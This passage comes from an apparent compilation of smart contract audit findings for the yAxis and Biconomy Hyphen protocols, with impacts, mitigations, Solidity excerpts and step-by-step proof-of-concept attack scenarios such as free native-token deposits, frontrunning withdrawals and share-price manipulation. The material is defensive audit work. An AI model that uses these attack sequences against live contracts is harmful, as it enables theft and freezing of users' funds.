As 2M of DAI + 1M of USDC worth much more than 3M of USDT. The attacker will profit and all other users will be losing funds.

#### Recommended Mitigation Steps
Always consider the price differences between tokens.




**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,`VaultHelper` deposits don't work with fee-on transfer tokens,medium,"There are ERC20 tokens that may make certain customizations to their ERC20 contracts.
One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.
Others are rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time).

#### Impact
The `VaultHelper`'s `depositVault()` and `depositMultipleVault` functions transfer `_amount` to `this` contract using `IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);`.
This could have a fee, and less than `_amount` ends up in the contract.
The next actual vault deposit using `IVault(_vault).deposit(_token, _amount);` will then try to transfer more than the `this` contract actually has and will revert the transaction.

#### Recommended Mitigation Steps
One possible mitigation is to measure the asset change right before and after the asset-transferring routines.
This is already done correctly in the `Vault.deposit` function."
30.md,ERC20 return values not checked,medium,"The `ERC20.transfer()` and `ERC20.transferFrom()` functions return a boolean value indicating success. This parameter needs to be checked for success.
Some tokens do **not** revert if the transfer failed but return `false` instead.

The `Manager.recoverToken` function does not check the return value of this function.

#### Impact
Tokens that don't actually perform the transfer and return `false` are still counted as a correct transfer.
Furthermore, tokens that do not correctly implement the EIP20 standard, like USDT which does not return a success boolean, will revert.

#### Recommended Mitigation Steps
We recommend using [OpenZeppelin’s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeTransfer` and `safeTransferFrom` functions that handle the return value check as well as non-standard-compliant tokens."
30.md,`Vault.withdraw` sometimes burns too many shares,medium,"The `Vault.withdraw` function attempts to withdraw funds from the controller if there are not enough in the vault already.
In the case the controller could not withdraw enough, i.e., where `_diff < _toWithdraw`, the user will receive **less** output tokens than their fair share would entitle them to (the initial `_amount`).

```solidity
if (_diff < _toWithdraw) {
    // @audit burns too many shares for a below fair-share amount
    _amount = _balance.add(_diff);
}
```

#### Impact
The withdrawer receives fewer output tokens than they were entitled to.

#### Recommended Mitigation Steps
In the mentioned case, the `_shares` should be recomputed to match the actual withdrawn `_amount` tokens:

```solidity
if (_diff < _toWithdraw) {
    _amount = _balance.add(_diff);
    // recompute _shares to burn based on the lower payout
    // should be something like this, better to cache balance() once at the start and use that cached value
    _shares = (totalSupply().mul(_amount)).div(_balance);
}
```

Only these shares should then be burned.



**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,Adding asymmetric liquidity in `_addLiquidity` results in fewer LP tokens minted than what should be wanted,medium,"#### Impact
Because the call in `_addLiquidity` forwards the entire balances of the 3 stablecoins without checking the ratio.
between the 3, less liquidity is minted than what should be wanted. Furthermore, an attacker can abuse this arbitrage the forwarded balances if the discrepancy is large enough.

For example, suppose the contract holds \$10K each of usdc, usdt, dai. An attacker deposits \$100K worth of DAI
and get credited with \$100K worth of shares in the protocol. Liquidity is added, but since the ratio is now skewed
11:1:1, a lot less liquidity is minted by the stableswap algorithm to the protocol. The attacker can now arbitrage the curve pool for an additional profit.

There doesn't even need to be an attacker, just an unbalanced amount of user deposits will also lead to lower liquidity minted.

#### Proof of Concept
- [`NativeStrategyCurve3Crv.sol` L73](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/strategies/NativeStrategyCurve3Crv.sol#L73)

#### Recommended Mitigation Steps
Adding liquidity should probably be managed more manually, it should be added in equal proportion to the curve pool balances, not the contract balances.



**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,Vault: Swaps at parity with swap fee = withdrawal fee,medium,"##### Impact
The vault treats all assets to be of the same price. Given that one can also deposit and withdraw in the same transaction, this offers users the ability to swap available funds held in the vault at parity, with the withdrawal protection fee (0.1%) effectively being the swap fee.

Due care and consideration should therefore be placed if new stablecoins are to be added to the vault (eg. algorithmic ones that tend to occasionally be off-peg), or when lowering the withdrawal protection fee.

##### Recommended Mitigation Steps
*   Prevent users from depositing and withdrawing in the same transaction. This would help prevent potential flash loan attacks as well
*   `setWithdrawalProtectionFee()` could have a requirement for the value to be non-zero. Zero withdrawal fee could be set in `setHalted()` whereby only withdrawals will be allowed.
*   Use price oracles to accurately calculate the shares to be transferred to users for deposits, or token amounts to be sent for withdrawals



**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,# Controller is vulnerable to sandwich attack,medium,"#### Impact
The protocol frequently interacts with crv a lot. However, the contract doesn't specify the minimum return amount.
Given the fact that there's a lot of MEV searchers, calling swap without specifying the minimum return amount really puts user funds in danger.

For example, controller's `withdrawAll` is designed to transfer all the funds in a strategy.[Controller.sol#L360](https://github.com/code-423n4/2021-09-yaxis/blob/a78d392156b90f8ac27de6d57cb0de2697d480d5/contracts/v3/controllers/Controller.sol#L360) The arbitrage space is enough for a searcher to sandwich this trade.

#### Proof of Concept
[Manager.sol#L442-L452](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Manager.sol#L442-L452)

[Controller.sol#L273](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L273)

#### Recommended Mitigation Steps
Always calculates an estimate return when calling to crv."
30.md,Vault: Withdrawals can be frontrun to cause users to burn tokens without receiving funds in return,medium,"##### Impact
Let us assume either of the following cases:

1.  The vault / protocol is to be winded down or migrated, where either the protocol is halted and `withdrawAll()` has been called on all active strategies to transfer funds into the vault.
2.  There are 0 strategies. Specifically, `_controller.strategies() = 0`

Attempted withdrawals can be frontrun such that users will receive less, or even no funds in exchange for burning vault tokens. This is primarily enabled by the feature of having deposits in multiple stablecoins.

##### Proof of Concept
1.  Assume `getPricePerFullShare()` of `1e18` (1 vault token = 1 stablecoin). Alice has 1000 vault tokens, while Mallory has 2000 vault tokens, with the vault holdings being 1000 USDC, 1000 USDT and 1000 DAI.
2.  Alice attempts to withdraw her deposit in a desired stablecoin (Eg. USDC).
3.  Mallory frontruns Alice's transaction and exchanges 1000 vault tokens for the targeted stablecoin (USDC). The vault now holds 1000 USDT and 1000 DAI.
4.  Alice receives nothing in return for her deposit because the vault no longer has any USDC. `getPricePerFullShare()` now returns `2e18`.
5.  Mallory splits his withdrawals evenly, by burning 500 vault tokens for 1000 USDT and the other 500 vault tokens for 1000 DAI.

Hence, Mallory is able to steal Alice's funds by frontrunning her withdrawal transaction.

##### Recommended Mitigation Steps
The withdrawal amount could be checked against `getPricePerFullShare()`, perhaps with reasonable slippage.




**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,`Controller.inCaseStrategyGetStuck` does not update balance,medium,"The `Controller.inCaseStrategyGetStuck` withdraws from a strategy but does not call `updateBalance(_vault, _strategy)` afterwards.

#### Impact
The `_vaultDetails[_vault].balances[_strategy]` variable does not correctly track the actual strategy balance anymore.
I'm not sure what exactly this field is used for besides getting the withdraw amounts per strategy in `getBestStrategyWithdraw`.
As the strategy contains a lower amount than stored in the field, `Controller.withdraw` will attempt to withdraw too much.

#### Recommended Mitigation Steps
Call `updateBalance(_vault, _strategy)` in `inCaseStrategyGetStuck`.




**BobbyYaxis (yAxis) noted:**
> It's a needed function for the strategist. The risk of these functions are mitigated as the strategies and controller should never have a balance of any tokens regardless. So there should be nothing/meaningful for the strategist to ever ""rug"" in that sense. But we can make this a governance-only feature, rather than strategist."
30.md,token -> vault mapping can be overwritten,medium,"One vault can have many tokens, but each token should only be assigned to a single vault.
The `Manager` contract keeps a mapping of tokens to vaults in the `vaults[_token] => _vault` map, and a mapping of vault to tokens in `tokens[vault] => token[]`.

The `addToken` function can assign any token to a single vault and allows overwriting an existing `vaults[_token]` map entry with a different vault.
This indirectly disassociates the previous vault for the token.
Note that the previous vault's `tokens[_previousVault]` map still contains the `token`.

#### Impact
The token disappears from the system for the previous vault but the actual tokens are still in there, getting stuck.
Only the new vault is considered for the token anymore, which leads to many issues, see `Controller.getBestStrategyWithdraw` and the `onlyVault` modifier that doesn't work correctly anymore.

#### Recommended Mitigation Steps
It should check if the `token` is already used in a map, and either revert or correctly remove the token from the vault - from the `tokens` array.
It should do the same cleanup procedure as in `removeToken`:

```solidity
if (found) {
    // remove the token from the vault
    tokens[_vault][index] = tokens[_vault][k-1];
    tokens[_vault].pop();
    delete vaults[_token];
    emit TokenRemoved(_vault, _token);
}
```

`addToken` should also check that the token is not already in the `tokens[_vault]` array."
30.md,`YAxisVotePower.balanceOf` can be manipulated,medium,"The `YAxisVotePower.balanceOf` contract uses the Uniswap pool reserves to compute a `_lpStakingYax` reward:

```solidity
(uint256 _yaxReserves,,) = yaxisEthUniswapV2Pair.getReserves();
int256 _lpStakingYax = _yaxReserves
    .mul(_stakeAmount)
    .div(_supply)
    .add(rewardsYaxisEth.earned(_voter));
```

The pool can be temporarily manipulated to increase the `_yaxReserves` amount.

#### Impact
If this voting power is used for governance proposals, an attacker can increase their voting power and pass a proposal.

#### Recommended Mitigation Steps
One could build a TWAP-style contract that tracks a time-weighted-average reserve amount (instead of the price in traditional TWAPs).
This can then not be manipulated by flashloans."
30.md,wrong YAXIS estimates,medium,"The `Harvester.getEstimates` contract tries to estimate a `YAXIS` amount but uses the wrong path and/or amount.

It currently uses a `WETH` **input** amount to compute a `YAXIS -> WETH` trade.

```solidity
address[] memory _path;
_path[0] = IStrategy(_strategy).want();
_path[1] = IStrategy(_strategy).weth();
// ...

_path[0] = manager.yaxis();
// path is YAXIS -> WETH now
// fee is a WETH precision value
uint256 _fee = _estimatedWETH.mul(manager.treasuryFee()).div(ONE_HUNDRED_PERCENT);
// this will return wrong trade amounts
_amounts = _router.getAmountsOut(_fee, _path);
_estimatedYAXIS = _amounts[1];
```

#### Impact
The estimations from `getEstimates` are wrong.
They seem to be used to provide min. amount slippage values `(_estimatedWETH, _estimatedYAXIS)` for the harvester when calling `Controller._estimatedYAXIS`.
These are then used in `BaseStrategy._payHarvestFees` and can revert the harvest transactions if the wrongly computed `_estimatedYAXIS` value is above the actual trade value.
Or they can allow a large slippage if the `_estimatedYAXIS` value is below the actual trade value, which can then be used for a sandwich attack.

#### Recommended Mitigation Steps
Fix the estimations computations.

As the estimations are used in `BaseStrategy._payHarvestFees`, the expected behavior seems to be trading `WETH` to `YAXIS`.
The path should therefore be changed to `path[0] = WETH; path[1] = YAXIS` in `Harvester.getEstimates`."
30.md,Harvest can be frontrun,medium,"#### Impact
In the `NativeStrategyCurve3Crv._harvest` there are two instances that a bad actor could use to frontrun the harvest.

First, when we are swapping WETH to a stablecoin by calling `_swapTokens(weth, _stableCoin, _remainingWeth, 1)` the function isn't checking the slippage, leading to the risk to a frontun (by imbalancing the Uniswap pair) and losing part of the harvesting profits.

Second, during the `_addLiquidity` internal function: this calls `stableSwap3Pool.add_liquidity(amounts, 1)` not considering the slippage when minting the 3CRV tokens.

#### Proof of Concept
[`NativeStrategyCurve3Crv.sol` L108](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/strategies/NativeStrategyCurve3Crv.sol#L108)

#### Tools Used
editor

#### Recommended Mitigation Steps
In the function `_harvest(_estimatedWETH, _estimatedYAXIS)` consider adding two additional estimated quantities: one for the swapped-out stablecoin and one for the minted 3CRV.





**BobbyYaxis (yAxis) noted:**
> Mitigated in PR 114: https://github.com/yaxis-project/metavault/pull/114"
30.md,`manager.allowedVaults` check missing for add/remove strategy,medium,"#### Impact
The `manager.allowedVaults` check is missing for add/remove strategy like how it is used in `reorderStrategies()`. This will allow a strategist to accidentally/maliciously add/remove strategies on unauthorized vaults.

Given the critical access control that is missing on vaults here, this is classified as medium severity.

#### Proof of Concept
- [`Controller.sol#L101` L130](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/controllers/Controller.sol#L101-L130)
- [`Controller.sol#L172` L207](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/controllers/Controller.sol#L172-L207)
- [`Controller.sol` L224](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/controllers/Controller.sol#L224)
- [`Manager.sol#L210` L221](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/Manager.sol#L210-L221)

#### Tools Used
Manual Analysis

#### Recommended Mitigation Steps
Add `manager.allowedVaults` check in `addStrategy()` and `removeStrategy()`"
30.md,Halting the protocol should be `onlyGovernance` and not` onlyStrategist`,medium,"#### Impact
A malicious strategist can halt the entire protocol and force a permanent shutdown once they observe that governance is trying to set a new strategist and they do not agree with that decision. They may use the 7 day window to halt the protocol. The access control on `setHalted()` should be `onlyGovernance`.

#### Proof of Concept
- [`Manager.sol#L515` L522](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/Manager.sol#L515-L522)
- [`Manager.sol#L333` L345](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/Manager.sol#L333-L345)

#### Tools Used
Manual Analysis

#### Recommended Mitigation Steps
Change access control to `onlyGovernance` from` onlyStrategist` for `setHalted()`"
97.md,Can deposit native token for free and steal funds,high,"[LiquidityPool.sol#L151](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityPool.sol#L151)<br>

The `depositErc20` function allows setting `tokenAddress = NATIVE` and does not throw an error.<br>
No matter the `amount` chosen, the `SafeERC20Upgradeable.safeTransferFrom(IERC20Upgradeable(tokenAddress), sender, address(this), amount);` call will not revert because it performs a low-level call to `NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE`, which is an EOA, and the low-level calls to EOAs always succeed.<br>
Because the `safe*` version is used, the EOA not returning any data does not revert either.<br>

This allows an attacker to deposit infinite native tokens by not paying anything.<br>
The contract will emit the same `Deposit` event as a real `depositNative` call and the attacker receives the native funds on the other chain.

### Recommended Mitigation Steps

Check `tokenAddress != NATIVE` in `depositErc20`.





***"
97.md,`LiquidityProviders.sol` The share price of the LP can be manipulated and making future liquidityProviders unable to `removeLiquidity()`,high,"[LiquidityProviders.sol#L345-L362](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityProviders.sol#L345-L362)<br>

```solidity
function removeLiquidity(uint256 _nftId, uint256 _amount)
    external
    nonReentrant
    onlyValidLpToken(_nftId, _msgSender())
    whenNotPaused
{
    (address _tokenAddress, uint256 nftSuppliedLiquidity, uint256 totalNFTShares) = lpToken.tokenMetadata(_nftId);
    require(_isSupportedToken(_tokenAddress), ""ERR__TOKEN_NOT_SUPPORTED"");

    require(_amount != 0, ""ERR__INVALID_AMOUNT"");
    require(nftSuppliedLiquidity >= _amount, ""ERR__INSUFFICIENT_LIQUIDITY"");
    whiteListPeriodManager.beforeLiquidityRemoval(_msgSender(), _tokenAddress, _amount);
    // Claculate how much shares represent input amount
    uint256 lpSharesForInputAmount = _amount * getTokenPriceInLPShares(_tokenAddress);

    // Calculate rewards accumulated
    uint256 eligibleLiquidity = sharesToTokenAmount(totalNFTShares, _tokenAddress);
```

[LiquidityProviders.sol#L192-L194](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityProviders.sol#L192-L194)<br>

```solidity
function sharesToTokenAmount(uint256 _shares, address _tokenAddress) public view returns (uint256) {
    return (_shares * totalReserve[_tokenAddress]) / totalSharesMinted[_tokenAddress];
}
```

The share price of the liquidity can be manipulated to an extremely low value (1 underlying token worth a huge amount of shares), making it possible for `sharesToTokenAmount(totalNFTShares, _tokenAddress)` to overflow in `removeLiquidity()` and therefore freeze users' funds.

### Proof of Concept

1.  Alice `addTokenLiquidity()` with `1e8 * 1e18` XYZ on B-Chain, totalSharesMinted == `1e44`;
2.  Alice `sendFundsToUser()` and bridge `1e8 * 1e18` XYZ from B-Chain to A-Chain;
3.  Alice `depositErc20()` and bridge `1e8 * 1e18` XYZ from A-Chain to B-Chain;
4.  Alice `removeLiquidity()` and withdraw `1e8 * 1e18 - 1` XYZ, then: `totalReserve` == `1 wei` XYZ, and `totalSharesMinted` == `1e26`;
5.  Bob `addTokenLiquidity()` with `3.4e7 * 1e18` XYZ;
6.  Bob tries to `removeLiquidity()`.

Expected Results: Bob to get back the deposits;

Actual Results: The tx reverted due to overflow at `sharesToTokenAmount()`.

### Recommended Mitigation Steps

[LiquidityProviders.sol#L280-L292](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityProviders.sol#L280-L292)<br>

```solidity
function _increaseLiquidity(uint256 _nftId, uint256 _amount) internal onlyValidLpToken(_nftId, _msgSender()) {
    (address token, uint256 totalSuppliedLiquidity, uint256 totalShares) = lpToken.tokenMetadata(_nftId);

    require(_amount > 0, ""ERR__AMOUNT_IS_0"");
    whiteListPeriodManager.beforeLiquidityAddition(_msgSender(), token, _amount);

    uint256 mintedSharesAmount;
    // Adding liquidity in the pool for the first time
    if (totalReserve[token] == 0) {
        mintedSharesAmount = BASE_DIVISOR * _amount;
    } else {
        mintedSharesAmount = (_amount * totalSharesMinted[token]) / totalReserve[token];
    }
    ...
```

Consider locking part of the first mint's liquidity to maintain a minimum amount of `totalReserve[token]`, so that the share price can not be easily manipulated.






***"
97.md,Wrong formula when add fee `incentivePool` can lead to loss of funds.,high,"[LiquidityPool.sol#L319-L322](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityPool.sol#L319-L322)<br>

The `getAmountToTransfer` function of `LiquidityPool` updates `incentivePool[tokenAddress]` by adding some fee to it but the formula is wrong and the value of `incentivePool[tokenAddress]` will be divided by `BASE_DIVISOR` (10000000000) each time.
After just a few time, the value of `incentivePool[tokenAddress]` will become zero and that amount of `tokenAddress` token will be locked in contract.

### Proof of concept

Line 319-322

    incentivePool[tokenAddress] = (incentivePool[tokenAddress] + (amount * (transferFeePerc - tokenManager.getTokensInfo(tokenAddress).equilibriumFee))) / BASE_DIVISOR;

Let `x = incentivePool[tokenAddress]`, `y = amount`, `z = transferFeePerc` and `t = tokenManager.getTokensInfo(tokenAddress).equilibriumFee`. Then that be written as

    x = (x + (y * (z - t))) / BASE_DIVISOR;
    x = x / BASE_DIVISOR + (y * (z - t)) / BASE_DIVISOR;

### Recommended Mitigation Steps

Fix the bug by changing lines 319-322 to:

    incentivePool[tokenAddress] += (amount * (transferFeePerc - tokenManager.getTokensInfo(tokenAddress).equilibriumFee)) / BASE_DIVISOR;






***"
97.md,Deleting `nft Info` can cause users' `nft.unpaidRewards` to be permanently erased,high,"[LiquidityFarming.sol#L229-L253](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityFarming.sol#L229-L253)<br>

```solidity
function withdraw(uint256 _nftId, address payable _to) external whenNotPaused nonReentrant {
    address msgSender = _msgSender();
    uint256 nftsStakedLength = nftIdsStaked[msgSender].length;
    uint256 index;
    for (index = 0; index < nftsStakedLength; ++index) {
        if (nftIdsStaked[msgSender][index] == _nftId) {
            break;
        }
    }

    require(index != nftsStakedLength, ""ERR__NFT_NOT_STAKED"");
    nftIdsStaked[msgSender][index] = nftIdsStaked[msgSender][nftIdsStaked[msgSender].length - 1];
    nftIdsStaked[msgSender].pop();

    _sendRewardsForNft(_nftId, _to);
    delete nftInfo[_nftId];

    (address baseToken, , uint256 amount) = lpToken.tokenMetadata(_nftId);
    amount /= liquidityProviders.BASE_DIVISOR();
    totalSharesStaked[baseToken] -= amount;

    lpToken.safeTransferFrom(address(this), msgSender, _nftId);

    emit LogWithdraw(msgSender, baseToken, _nftId, _to);
}
```

[LiquidityFarming.sol#L122-L165](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityFarming.sol#L122-L165)<br>

```solidity
function _sendRewardsForNft(uint256 _nftId, address payable _to) internal {
    NFTInfo storage nft = nftInfo[_nftId];
    require(nft.isStaked, ""ERR__NFT_NOT_STAKED"");

    (address baseToken, , uint256 amount) = lpToken.tokenMetadata(_nftId);
    amount /= liquidityProviders.BASE_DIVISOR();

    PoolInfo memory pool = updatePool(baseToken);
    uint256 pending;
    uint256 amountSent;
    if (amount > 0) {
        pending = ((amount * pool.accTokenPerShare) / ACC_TOKEN_PRECISION) - nft.rewardDebt + nft.unpaidRewards;
        if (rewardTokens[baseToken] == NATIVE) {
            uint256 balance = address(this).balance;
            if (pending > balance) {
                unchecked {
                    nft.unpaidRewards = pending - balance;
                }
                (bool success, ) = _to.call{value: balance}("""");
                require(success, ""ERR__NATIVE_TRANSFER_FAILED"");
                amountSent = balance;
            } else {
                nft.unpaidRewards = 0;
                (bool success, ) = _to.call{value: pending}("""");
                require(success, ""ERR__NATIVE_TRANSFER_FAILED"");
                amountSent = pending;
            }
        } else {
            IERC20Upgradeable rewardToken = IERC20Upgradeable(rewardTokens[baseToken]);
            uint256 balance = rewardToken.balanceOf(address(this));
            if (pending > balance) {
                unchecked {
                    nft.unpaidRewards = pending - balance;
                }
                amountSent = _sendErc20AndGetSentAmount(rewardToken, balance, _to);
            } else {
                nft.unpaidRewards = 0;
                amountSent = _sendErc20AndGetSentAmount(rewardToken, pending, _to);
            }
        }
    }
    nft.rewardDebt = (amount * pool.accTokenPerShare) / ACC_TOKEN_PRECISION;
    emit LogOnReward(_msgSender(), baseToken, amountSent, _to);
}
```

When `withdraw()` is called, `_sendRewardsForNft(_nftId, _to)` will be called to send the rewards.

In `_sendRewardsForNft()`, when `address(this).balance` is insufficient at the moment, `nft.unpaidRewards = pending - balance` will be recorded and the user can get it back at the next time.

However, at L244, the whole `nftInfo` is being deleted, so that `nft.unpaidRewards` will also get erased.

There is no way for the user to get back this `unpaidRewards` anymore.

### Recommended Mitigation Steps

Consider adding a new parameter named `force` for `withdraw()`, `require(force || unpaidRewards == 0)` before deleting nftInfo.

 >
 > [HP-25: C4 Audit Fixes, Dynamic Fee Changes bcnmy/hyphen-contract#42](https://github.com/bcnmy/hyphen-contract/pull/42)







***"
97.md,"Users will lose a majority or even all of the rewards when the amount of total shares is too large, due to precision loss",high,"[LiquidityFarming.sol#L265-L291](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityFarming.sol#L265-L291)<br>

```solidity
function getUpdatedAccTokenPerShare(address _baseToken) public view returns (uint256) {
    uint256 accumulator = 0;
    uint256 lastUpdatedTime = poolInfo[_baseToken].lastRewardTime;
    uint256 counter = block.timestamp;
    uint256 i = rewardRateLog[_baseToken].length - 1;
    while (true) {
        if (lastUpdatedTime >= counter) {
            break;
        }
        unchecked {
            accumulator +=
                rewardRateLog[_baseToken][i].rewardsPerSecond *
                (counter - max(lastUpdatedTime, rewardRateLog[_baseToken][i].timestamp));
        }
        counter = rewardRateLog[_baseToken][i].timestamp;
        if (i == 0) {
            break;
        }
        --i;
    }

    // We know that during all the periods that were included in the current iterations,
    // the value of totalSharesStaked[_baseToken] would not have changed, as we only consider the
    // updates to the pool that happened after the lastUpdatedTime.
    accumulator = (accumulator * ACC_TOKEN_PRECISION) / totalSharesStaked[_baseToken];
    return accumulator + poolInfo[_baseToken].accTokenPerShare;
}
```

[LiquidityProviders.sol#L286-L292](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityProviders.sol#L286-L292)<br>

```solidity
uint256 mintedSharesAmount;
// Adding liquidity in the pool for the first time
if (totalReserve[token] == 0) {
    mintedSharesAmount = BASE_DIVISOR * _amount;
} else {
    mintedSharesAmount = (_amount * totalSharesMinted[token]) / totalReserve[token];
}
```

In `HyphenLiquidityFarming`, the `accTokenPerShare` is calculated based on the total staked shares.

However, as the `mintedSharesAmount` can easily become very large on `LiquidityProviders.sol`, all the users can lose their rewards due to precision loss.

### Proof of Concept

Given:

*   rewardsPerSecond is `10e18`;
*   lastRewardTime is 24 hrs ago;

Then:

1.  Alice `addTokenLiquidity()` with `1e8 * 1e18` XYZ on B-Chain, totalSharesMinted == `1e44`;
2.  Alice `deposit()` to HyphenLiquidityFarming, totalSharesStaked == `1e44`;
3.  24 hrs later, Alice tries to claim the rewards.

`accumulator = rewardsPerSecond * 24 hours` == 864000e18 == 8.64e23

Expected Results: As the sole staker, Alice should get all the `864000e18` rewards.

Actual Results: Alice received 0 rewards.

That's because when `totalSharesStaked > 1e36`, `accumulator = (accumulator * ACC_TOKEN_PRECISION) / totalSharesStaked[_baseToken];` will be round down to `0`.

When the `totalSharesStaked` is large enough, all users will lose their rewards due to precision loss.

### Recommended Mitigation Steps

1.  Consider lowering the `BASE_DIVISOR` so that the initial share price can be higher;
2.  Consider making `ACC_TOKEN_PRECISION` larger to prevent precision loss;

See also the Recommendation on [Issue #139](https://github.com/code-423n4/2022-03-biconomy-findings/issues/139).






***"
97.md,Unsupported tokens cannot be withdrawn,medium,"[LiquidityProviders.sol#L273](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityProviders.sol#L273)<br>

Supported tokens can be turned off again by calling `TokenManager.removeSupportedToken`.<br>
Users won't be able to withdraw their liquidity anymore because of [this check](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityProviders.sol#L352) in `removeLiquidity`.

### Recommended Mitigation Steps

Consider allowing withdrawals even if the token was unsupported to allow users to reclaim their funds.






***"
97.md,A `pauser` can brick the contracts,medium,"[Pausable.sol#L65-L68](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/security/Pausable.sol#L65-L68)<br>

```solidity
    function renouncePauser() external virtual onlyPauser {
        emit PauserChanged(_pauser, address(0));
        _pauser = address(0);
    }
```

A malicious or compromised `pauser` can call `pause()` and `renouncePauser()` to brick the contract and all the funds can be frozen.

### Proof of Concept

Given:

*   Alice (EOA) is the `pauser` of the contract.

1.  Alice calls `pause()` ;
2.  Alice calls `renouncePauser()`;

As a result, most of the contract's methods are now unavailable, and this cannot be reversed even by the `owner`.

### Recommended Mitigation Steps

Consider removing `renouncePauser()`, or requiring the contract not in `paused` mode when `renouncePauser()`.

 >
 > [HP-25: C4 Audit Fixes, Dynamic Fee Changes bcnmy/hyphen-contract#42](https://github.com/bcnmy/hyphen-contract/pull/42)




***"
97.md,Incompatibility With Rebasing/Deflationary/Inflationary token,medium,"The scope contracts do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.

### Proof of Concept

[TokenManager.sol](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol)<br>

### Recommended Mitigation Steps

Make sure token vault accounts for any rebasing/inflation/deflation.<br>
Add support in contracts for such tokens before accepting user-supplied tokens.






***"
97.md,Owners have absolute control over protocol,medium,"[LiquidityFarming.sol#L174-L192](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L174-L192)<br>

Owners have full control over the protocol.

### Proof of Concept

Owners have full control over:

*   executors who perform token transfers on behalf of the destination chain
*   reclaiming / withdrawing any tokens (including reward tokens) held by farming contract
*   total upgradeability
*   instant parameters change (no timelock)
*   1 step owner change (gold standard is 2-step owner change)

### Recommended Mitigation Steps

Make executors decentralized.<br>
Add TimeLock for parameter changes.





***"
97.md,Frontrunning of `setPerTokenWalletCap` edge case,medium,"The `setPerTokenWalletCap()` function in WhitelistPeriodManager.sol [contains a comment](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/WhitelistPeriodManager.sol#L196-L200) stating:

    Special care must be taken when calling this function
    There are no checks for _perTokenWalletCap (since it's onlyOwner), but it's essential that it should be >= max lp provided by an lp.
    Checking this on chain will probably require implementing a bbst, which needs more bandwidth
    Call the view function getMaxCommunityLpPositon() separately before changing this value

